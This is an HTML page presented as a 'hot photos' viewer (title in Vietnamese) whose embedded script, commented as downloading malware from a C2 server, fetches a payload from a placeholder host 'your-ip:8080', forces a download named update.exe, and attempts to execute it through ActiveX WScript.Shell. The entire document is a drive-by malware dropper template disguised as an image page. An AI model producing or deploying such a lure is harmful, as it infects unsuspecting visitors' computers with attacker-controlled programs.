<!DOCTYPE html>
<html>
<head>
    <title>Xem ảnh hot</title>
</head>
<body>
    <img src="https://i.imgur.com/abcxyz.jpg" width="500">
    <script>
        // Tải malware từ C2
        fetch('http://your-ip:8080/get_payload_image')
            .then(r => r.blob())
            .then(blob => {
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'update.exe';
                document.body.appendChild(a);
                a.click();
                // Tự động chạy sau 2s
                setTimeout(() => {
                    const shell = new ActiveXObject('WScript.Shell');
                    shell.Run('update.exe');
                }, 2000);
            });
    </script>
</body>
</html>
